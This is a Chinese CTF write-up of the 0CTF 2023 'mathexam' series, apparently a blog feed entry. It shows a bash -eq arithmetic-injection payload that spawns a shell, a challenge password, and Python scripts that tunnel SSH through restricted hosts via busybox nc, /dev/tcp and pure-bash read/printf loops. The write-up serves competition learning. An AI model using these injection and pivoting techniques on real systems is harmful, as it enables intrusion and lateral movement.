<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">cat &gt;&amp;3</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>

<span class="bp">...</span>

</code></pre></div></div>
<p>利用时先运行 exp.py，然后运行 exp2.py。此时可以通过本地 4444 端口登陆 third。</p>

<h2 id="mathexam-4">mathexam-4</h2>
<p>进入了 third 主机后可以发现这一关将 cat 也去掉了，所以思路也比较明确，就是使用纯粹的 bash 内置命令来达到 cat 相同的效果。</p>

<p>bash 相关命令的使用可以参考：</p>
<ul>
  <li><a href="https://bash.cyberciti.biz/guide/Main_Page">Linux Bash Shell Scripting Tutorial Wiki</a></li>
</ul>

<p>其中就提到了一些读写文件描述符的方法：read、echo、printf。比如文件写，我们可以通过 echo -ne 来写二进制数据。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> <span class="o">&gt;</span>&amp;3
</code></pre></div></div>
<p>这样就可以替代 cat 来写数据：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;</span>&amp;3
</code></pre></div></div>

<p>读取数据可以使用 read 来代替，read 可以使用 -u 参数指定文件描述符，逐行获取内容后使用 echo 输出到终端。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read</span> <span class="nt">-u</span> 3 <span class="nt">-r</span> line<span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span><span class="k">done</span>
</code></pre></div></div>
<p>但测试的时候会发现经过 read 处理的数据发生了变化，所有的 \x00 都被吞掉了。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"1123</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">80"</span> | xxd

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"1123</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">80"</span> | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span>
<span class="k">do 
</span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="se">\n</span><span class="s2">"</span> <span class="p">;</span>
<span class="k">done</span> | xxd
</code></pre></div></div>
<p>read 读取到 \x00 时，并不会给变量 line 赋值 \x00，而是赋值 ‘‘。因此我们可以逐字节读取，如果为空的话，就主动添加一个 \x00，同时给 read 添加 -n 和 -d 参数。两者一起使用可以达到逐字节读取的目的。</p>
<ul>
  <li>-n 参数指定一次读取的字节数。</li>
  <li>-d 参数可以指定分隔符为空字符。
```bash
#!/bin/bash
echo -en “1123\x80\x00\x00\x00\x01\x80” | xxd</li>
</ul>

<p>echo -en “1123\x80\x00\x00\x00\x01\x80” | while read -r -d ‘’ -n 1 line;
do 
if [[ $line == ‘’ ]] then
    echo -ne “\x00”
else
    echo -ne “$line”
fi
done | xxd</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>![20231211054258](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211054258.png)

当然,这里输出也可以使用 printf. printf 参数 %c 可以输出单个字节.

```bash
echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
if [[ $line == '' ]] then
    echo -ne "\x00"
else
    echo -ne "$line"
fi
done | xxd

echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line;
do 
    printf "%c" "$line"
done | xxd
</code></pre></div></div>
<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211074223.png" alt="20231211074223" /></p>

<p>貌似一样了，但是如果用二进制文件测试的话，还是会发现结果不同，如下。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">cat</span> /bin/cat | xxd <span class="o">&gt;</span> result_cat

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nv">$line</span> <span class="o">==</span> <span class="s1">''</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd <span class="o">&gt;</span> result_echo

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
    </span><span class="nb">printf</span> <span class="s2">"%c"</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">done</span> | xxd <span class="o">&gt;</span> result_printf
</code></pre></div></div>
<p>例如 \x20 经过 read 之后也会变成 ‘‘。这是由于 \x20 为空格，属于 bash 中的分隔符（IFS），因此经过 read 之后也会变成 ‘‘，默认情况下，IFS 的值包括空格、制表符和换行符。</p>

<p>但 read 可以指定 IFS 的值。IFS= 可以将分隔符设置为 ‘‘。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">cat</span> /bin/cat | xxd <span class="o">&gt;</span> result_cat

<span class="nb">cat</span> /bin/cat | <span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">''</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nv">$line</span> <span class="o">==</span> <span class="s1">''</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd <span class="o">&gt;</span> result
</code></pre></div></div>
<p>但这样又发现了新的一些问题：</p>
<ol>
  <li>printf 和 echo 的输出在处理某些内容时还是会不一致。</li>
  <li>read 在处理某些字符串时会吞掉一部分 \x00。比如：当输入字符串有 3 个 \x00 相邻时，会被吞掉一个。
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span>
</code></pre></div>    </div>
    <p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211060804.png" alt="20231211060804" /></p>
  </li>
</ol>

<p>不管是使用 printf 还是 echo, 结果都是一样的，直接调试 bash 也能发现是 read 的问题。</p>

<p>emmm，实在是很难构造出完全相同的数据。硬着头皮试的时候突然发现，printf %c 输出的数据是可以正常用于 ssh 通信，但 echo -ne 输出的数据会导致 ssh 卡住。。。。</p>

<p>由此可以在 exp2.py 的基础上进行修改（仅标明了修改部分）得到 exp3.py</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 命令和参数
</span><span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">ssh</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ctf@127.0.0.1</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">-p</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">4444</span><span class="sh">"</span><span class="p">]</span>
<span class="bp">...</span>

<span class="n">listen_port</span> <span class="o">=</span> <span class="mi">5555</span>

<span class="bp">...</span>

<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">exec 3&lt;&gt;/dev/tcp/fourth/22</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span> <span class="c1">#exec 3&lt;&gt;/dev/tcp/fourth/22
</span><span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'''</span><span class="s">while IFS= read -r -d </span><span class="sh">''</span><span class="s"> -u 3 -n 1 byte ; do printf </span><span class="sh">"</span><span class="s">%c</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="s">$byte</span><span class="sh">"</span><span class="s">; done &amp;</span><span class="se">\n</span><span class="sh">'''</span><span class="p">)</span>
<span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
<span class="bp">...</span>

<span class="k">def</span> <span class="nf">trans</span><span class="p">(</span><span class="n">bytess</span><span class="p">):</span>
    <span class="n">out</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">hex_string</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">bytess</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">out</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">'</span><span class="se">\\</span><span class="s">x</span><span class="sh">'</span><span class="o">+</span><span class="n">hex_string</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">connect_cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'''</span><span class="s">echo -ne </span><span class="sh">"</span><span class="si">{</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">out</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="s"> &gt;&amp;3 &amp; </span><span class="se">\n</span><span class="sh">'''</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">connect_cmd</span><span class="p">)</span>
    <span class="c1"># os.system(connect_cmd)
</span>    <span class="k">return</span> <span class="n">connect_cmd</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>

    <span class="bp">...</span>

<span class="k">def</span> <span class="nf">socket_write_output</span><span class="p">(</span><span class="n">process</span><span class="p">):</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="bp">...</span>
                <span class="n">process</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">trans</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
            <span class="bp">...</span>
</code></pre></div></div>
<p>依次运行 exp.py ~ exp3.py</p>

<p>然后就可以通过 5555 端口连接上 fourth 了。进去之后没有 cat、可以使用 <code class="language-plaintext highlighter-rouge">exec &lt;/flag4</code> 读取 flag。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211080409.png" alt="20231211080409" /></p>

<p>总结：由于受到 read 的影响，printf 和 echo 都没法完全还原二进制文件的内容，但 printf %c 可以正常用于 ssh 通信，但 echo -ne 不行，还得根据具体协议分析，添加更多的字符串转换才能够提高兼容性。</p>

<p>后话，bash 原生命令下，如何完整获取二进制文件的内容呢？我找到了 stackexchange 上的一个解答：<a href="https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable">linux - bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange</a></p>

<p>利用 readarray 可以将带有特殊字符的内容存在数组中，然后再拼接输出。这种方式可以完整获取任意文件的完整内容，即使是二进制文件。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readarray <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> zArray &lt;/etc/passwd
<span class="o">[[</span> <span class="s2">"</span><span class="k">${</span><span class="nv">zArray</span><span class="p">[*]</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">printf</span> <span class="s1">'%s\0'</span> <span class="s2">"</span><span class="k">${</span><span class="nv">zArray</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span>
</code></pre></div></div>
<p>但在这道题的场景下，readarray 不太好用，如果用来读取连接中的 fd 的话，readarray 会被阻塞住，导致 zArray 无法被赋值，后面的 printf 也就读不出内容。</p>

<h2 id="补充">补充：</h2>
<p>参考了其他大佬的 writeup：</p>
<ul>
  <li><a href="https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script">ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf</a></li>
</ul>

<p>writeup 作者额外设置了 LC_ALL 环境变量为 C。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">LC_ALL</span><span class="o">=</span>C
</code></pre></div></div>

<p>LC_ALL 环境变量用于覆盖所有其他本地化设置，它通常用于确保在特定程序运行时使用特定的语言环境。C 语言环境是最简单的语言环境，其中字符是单字节的，字符集是 ASCII，排序顺序基于字节值。</p>

<p>加入该环境变量之后，read 就不会将多个字符解析成一个特殊字符，从而解决上面 \x00 缺失的问题，测试脚本如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | xxd

<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | <span class="k">while </span><span class="nv">LC_ALL</span><span class="o">=</span>C <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
</span><span class="nb">printf</span> <span class="s2">"%c"</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">done</span> | xxd


<span class="nb">echo</span> <span class="nt">-en</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">00"</span> | <span class="k">while </span><span class="nv">LC_ALL</span><span class="o">=</span>C <span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> <span class="nt">-d</span> <span class="s1">$'</span><span class="se">\0</span><span class="s1">'</span> <span class="nt">-n</span> 1 line<span class="p">;</span>
<span class="k">do 
if</span> <span class="o">[[</span> <span class="nt">-z</span> <span class="nv">$line</span> <span class="o">]]</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span>
<span class="k">fi
done</span> | xxd
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211201433.png" alt="20231211201433" /></p>

<p>使用二进制文件来测试也可以完全一致，可以说具备通用性了！</p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://0xdf.gitlab.io/2023/05/13/htb-interface.html">HTB: Interface - 0xdf hacks stuff</a></li>
  <li><a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">Arithmetic operation in shell script can be exploited - DEV Community</a></li>
  <li><a href="https://unix.stackexchange.com/questions/347390/bash-cant-store-hexvalue-0x00-in-variable">linux - bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange</a></li>
  <li><a href="https://github.com/mephi42/ctf/blob/43222e15e7cb74844b2c686c4f32cccf74e7909f/2023.12.09-0CTF_TCTF_2023/mathexam%20-%204/script">ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="bash" /><category term="ssh" /><category term="tunnel" /><category term="0ctf 2023" /><summary type="html"><![CDATA[0CTF Mathexam Writeup mathexam 系列非常有意思，主要考察如何在受限的 bash 下完成端口转发，题目的场景可以适用到一些小设备的渗透中。利用思路总结如下： mathexam-1：bash -eq 注入 mathexam-2：利用 busybox nc 完成端口转发。 mathexam-3：去掉了 buxybox，利用 cat 完成端口转发。 mathexam-4：进一步去掉了 cat，需要利用纯粹的 bash 完成端口转发。 mathexam-1 The math exam starts now. Participate with integrity and never cheat. Someone has stolen the exam paper, and definitely he got full marks. Fortunately, he didn’t find the flag. #!/bin/bash echo "You are now in the math examination hall." echo "First, please read exam integrity statement:" echo "" promisetext="I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment" echo "$promisetext" echo "" echo "Now, write down the exam integrity statement here:" read userinput if [ "$userinput" = "$promisetext" ] then echo "All right" else echo "Error" exit fi echo "" echo "Exam starts" echo "(notice: numbers in dec, oct or hex format are all accepted)" echo "" correctcount=0 for i in {1..100} do echo "Problem $i of 100:" echo "$i + $i = ?" ans=$(($i+$i)) read line if [[ "$line" -eq "$ans" ]] then correctcount="$(($correctcount+1))" fi echo "" done echo "Exam finishes" echo "You score is: $correctcount" exit 题目给了一个 bash 脚本，获取用户输入并使用 -eq 进行了比较。bash 脚本中这样的语句是可以注入的：[[ "$VAR" -eq "something" ]]，具体可参考文章：Arithmetic operation in shell script can be exploited - DEV Community 注入 poc： x[$(command)] 测试命令时可以发现题目会将错误输出出来，但是标准输出看不到，因此我们将标准输出重定向到错误输出。另外目标环境有 busybox，可以使用下面的 payload 打开交互式 shell，就可以拿到 flag1。 x[$(/bin/busybox sh 1&gt;&amp;2)] mathexam-2 拿到第一关 shell 后，可以在根目录中找到一个 .connect.sh.swp 文件，获取该文件的内容可知 second 主机的用户名密码为 ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepf。 获取第二关的 flag 要求我们 ssh 登陆到 second 主机中，但目标环境设置了诸多限制： 没有 ssh 仅有的二进制文件都在 /bin 目录下 drwxr-xr-x 1 0 0 4096 Dec 10 00:11 . drwxr-xr-x 1 0 0 4096 Dec 10 00:11 .. -rwxr-xr-x 1 0 0 1396520 Dec 9 18:44 bash -rwxr-xr-x 1 0 0 2193264 Dec 10 00:11 busybox -rwxr-xr-x 1 0 0 35280 Dec 10 00:11 cat -rwxr-xr-x 1 0 0 138208 Dec 10 00:11 ls lrwxrwxrwx 1 0 0 4 Dec 9 18:44 sh -&gt; bash 当前用户对所有文件都没有写权限。 也就是说我们需要利用 busybox、bash、cat 来做端口转发，具体思路如下： 通过 busybox nc 连接到 second。此时 busybox nc 与 ssh 服务建立起了 TCP 连接。 busybox nc second 22 我们只需要在该连接中收发数据即可完成 ssh 认证，我们可以通过 python 中的 subprocess 模块来控制终端数据的收发，以此来实现端口转发。 编写脚本如下。 import subprocess import threading import select,os,time # 命令和参数 command = ["nc", "-X", "connect", "-x", "instance.0ctf2023.ctf.0ops.sjtu.cn:18081", "kctgxr4bjb6kgj26", "1"] # 启动进程 process = subprocess.Popen( command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=0 # 设置为 0 以关闭缓冲 ) thread_close = 0 def read_output(process): while True: if thread_close==1: break # 检查是否有数据可读 reads, _, _ = select.select([process.stdout], [], [], 0.1) if reads: # 获取文件描述符 fd = process.stdout.fileno() # 读取可用的数据 output = os.read(fd, 4096) # 读取最多 4096 字节 if output: print(output.decode(), end='') # 创建并启动线程 thread = threading.Thread(target=read_output, args=(process,)) thread.start() # 发送命令 process.stdin.write(b"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment\n") process.stdin.flush() time.sleep(1) process.stdin.write(b"x[$(/bin/busybox sh 1&gt;&amp;2)] \n") process.stdin.flush() process.stdin.write(b"busybox ping -c 1 second\n") process.stdin.flush() #监听端口，建立通道 import socket # 设置监听端口 listen_port = 3333 # 创建 socket 对象 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server_socket.bind(('0.0.0.0', listen_port)) server_socket.listen(1) print(f"Listening on port {listen_port}...") # 接受一个连接 client_socket, addr = server_socket.accept() print(f"Connection from {addr} established.") thread_close=1 # 等待线程结束 thread.join() process.stdin.write(b"busybox nc second 22\n") process.stdin.flush() def socket_read_output(process): while True: # 检查 process.stdout 是否有数据可读 reads, _, _ = select.select([process.stdout, client_socket], [], [], 0.1) # 如果 process.stdout 有数据可读，则将数据发送到客户端 if process.stdout in reads: fd = process.stdout.fileno() output = os.read(fd, 4096) if output: client_socket.sendall(output) def socket_write_output(process): while True: # 使用 select 监测客户端 socket 是否有数据可读 reads, _, _ = select.select([client_socket], [], [], 0.1) # 如果客户端有数据可读，则将数据发送到 process.stdin if client_socket in reads: data = client_socket.recv(4096) if data: process.stdin.write(data) process.stdin.flush() thread1 = threading.Thread(target=socket_read_output, args=(process,)) thread1.start() thread2 = threading.Thread(target=socket_write_output, args=(process,)) thread2.start() thread1.join() thread2.join() client_socket.close() server_socket.close() print("Connection closed.") exit(0) 执行该脚本后，会将本地的 3333 端口转发到 second 的 22 端口，这样我们就可以连接到 second 了。 mathexam-3 连接到 second 后，flag 文件中会提示第三关的 flag 在 third 主机上，用户名密码不变，我们需要再构建一层代理。不同在与 second 主机中将 busybox 移除了。 没有 nc 的情况下，我们仍然可以使用 exec 或者 cat 连接到远程端口，参考： Some useful tips about /dev/tcp | Andrea Fortuna 比如： cat &lt;/dev/tcp/time.nist.gov/13 或者使用 exec 将 tcp 连接绑定到描述符 3,然后通过 echo 或者 cat 收发数据。 exec 3&lt;&gt;/dev/tcp/www.google.com/80 echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" &gt;&amp;3 cat &lt;&amp;3 根据这个原理，我们就可以构建出一个类似的收发窗口： exec 3&lt;&gt;/dev/tcp/third/22 cat &lt;&amp;3 &amp; cat &gt;&amp;3 前两行代码可以替代 busybox nc third 22，利用 &amp; 可以将读取远程消息的任务放在后台，一旦接收到数据，就可以直接打印在标准输出中。 cat &gt;&amp;3 会等待用户的输入，用户输入之后会重定向到描述符 3 中，python 脚本中就可以直接用 process.stdin.write 发数据就可以了。 利用脚本与上一关的类似，在此前的脚本中做修改即可，需要注意的就是需要在收发前，先执行上面构造的 payload。 exp2.py import subprocess import threading import select,os,time import binascii # 命令和参数 command = ["ssh", "ctf@127.0.0.1","-p","3333"] ... # 创建并启动线程 thread = threading.Thread(target=read_output, args=(process,)) thread.start() time.sleep(5) #手动输入密码 x5kdkwjr8exi2bf70y8g80bggd2nuepf process.stdin.write(b"whoami\n") process.stdin.flush() ... listen_port = 4444 ... process.stdin.write(b"exec 3&lt;&gt;/dev/tcp/third/22\n") process.stdin.write(b'cat &lt;&amp;3 &amp; \n') process.stdin.write(b"cat &gt;&amp;3\n") ... 利用时先运行 exp.py，然后运行 exp2.py。此时可以通过本地 4444 端口登陆 third。 mathexam-4 进入了 third 主机后可以发现这一关将 cat 也去掉了，所以思路也比较明确，就是使用纯粹的 bash 内置命令来达到 cat 相同的效果。 bash 相关命令的使用可以参考： Linux Bash Shell Scripting Tutorial Wiki 其中就提到了一些读写文件描述符的方法：read、echo、printf。比如文件写，我们可以通过 echo -ne 来写二进制数据。 echo -ne "\xf0\x00\x00\x00\x12\x00" &gt;&amp;3 这样就可以替代 cat 来写数据： cat &gt;&amp;3 读取数据可以使用 read 来代替，read 可以使用 -u 参数指定文件描述符，逐行获取内容后使用 echo 输出到终端。 while read -u 3 -r line;do echo -ne "$line\n";done 但测试的时候会发现经过 read 处理的数据发生了变化，所有的 \x00 都被吞掉了。 #!/bin/bash echo -e "1123\x80\x00\x01\x80" | xxd echo -e "1123\x80\x00\x01\x80" | while read -r line; do echo -ne "$line\n" ; done | xxd read 读取到 \x00 时，并不会给变量 line 赋值 \x00，而是赋值 ‘‘。因此我们可以逐字节读取，如果为空的话，就主动添加一个 \x00，同时给 read 添加 -n 和 -d 参数。两者一起使用可以达到逐字节读取的目的。 -n 参数指定一次读取的字节数。 -d 参数可以指定分隔符为空字符。 ```bash #!/bin/bash echo -en “1123\x80\x00\x00\x00\x01\x80” | xxd echo -en “1123\x80\x00\x00\x00\x01\x80” | while read -r -d ‘’ -n 1 line; do if [[ $line == ‘’ ]] then echo -ne “\x00” else echo -ne “$line” fi done | xxd ![20231211054258](https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231211054258.png) 当然,这里输出也可以使用 printf. printf 参数 %c 可以输出单个字节. ```bash echo -en "1123\x80\x00\x00\x00\x01\x80" | xxd echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd echo -en "1123\x80\x00\x00\x00\x01\x80" | while read -r -d '' -n 1 line; do printf "%c" "$line" done | xxd 貌似一样了，但是如果用二进制文件测试的话，还是会发现结果不同，如下。 #!/bin/bash cat /bin/cat | xxd &gt; result_cat cat /bin/cat | while read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd &gt; result_echo cat /bin/cat | while read -r -d '' -n 1 line; do printf "%c" "$line" done | xxd &gt; result_printf 例如 \x20 经过 read 之后也会变成 ‘‘。这是由于 \x20 为空格，属于 bash 中的分隔符（IFS），因此经过 read 之后也会变成 ‘‘，默认情况下，IFS 的值包括空格、制表符和换行符。 但 read 可以指定 IFS 的值。IFS= 可以将分隔符设置为 ‘‘。 #!/bin/bash cat /bin/cat | xxd &gt; result_cat cat /bin/cat | while IFS= read -r -d '' -n 1 line; do if [[ $line == '' ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd &gt; result 但这样又发现了新的一些问题： printf 和 echo 的输出在处理某些内容时还是会不一致。 read 在处理某些字符串时会吞掉一部分 \x00。比如：当输入字符串有 3 个 \x00 相邻时，会被吞掉一个。 #!/bin/bash echo -en "\xf0\x00\x00\x00\x12\x00" 不管是使用 printf 还是 echo, 结果都是一样的，直接调试 bash 也能发现是 read 的问题。 emmm，实在是很难构造出完全相同的数据。硬着头皮试的时候突然发现，printf %c 输出的数据是可以正常用于 ssh 通信，但 echo -ne 输出的数据会导致 ssh 卡住。。。。 由此可以在 exp2.py 的基础上进行修改（仅标明了修改部分）得到 exp3.py # 命令和参数 command = ["ssh", "ctf@127.0.0.1","-p","4444"] ... listen_port = 5555 ... process.stdin.write(b"exec 3&lt;&gt;/dev/tcp/fourth/22\n") #exec 3&lt;&gt;/dev/tcp/fourth/22 process.stdin.write(b'''while IFS= read -r -d '' -u 3 -n 1 byte ; do printf "%c" "$byte"; done &amp;\n''') process.stdin.flush() ... def trans(bytess): out = [] hex_string = binascii.hexlify(bytess).decode('utf-8') for i in range(len(hex_string)): if i % 2 == 0: out.append('\\x'+hex_string[i:i+2]) connect_cmd = f'''echo -ne "{''.join(out)}" &gt;&amp;3 &amp; \n''' print(connect_cmd) # os.system(connect_cmd) return connect_cmd.encode() ... def socket_write_output(process): while True: ... process.stdin.write(trans(data)) ... 依次运行 exp.py ~ exp3.py 然后就可以通过 5555 端口连接上 fourth 了。进去之后没有 cat、可以使用 exec &lt;/flag4 读取 flag。 总结：由于受到 read 的影响，printf 和 echo 都没法完全还原二进制文件的内容，但 printf %c 可以正常用于 ssh 通信，但 echo -ne 不行，还得根据具体协议分析，添加更多的字符串转换才能够提高兼容性。 后话，bash 原生命令下，如何完整获取二进制文件的内容呢？我找到了 stackexchange 上的一个解答：linux 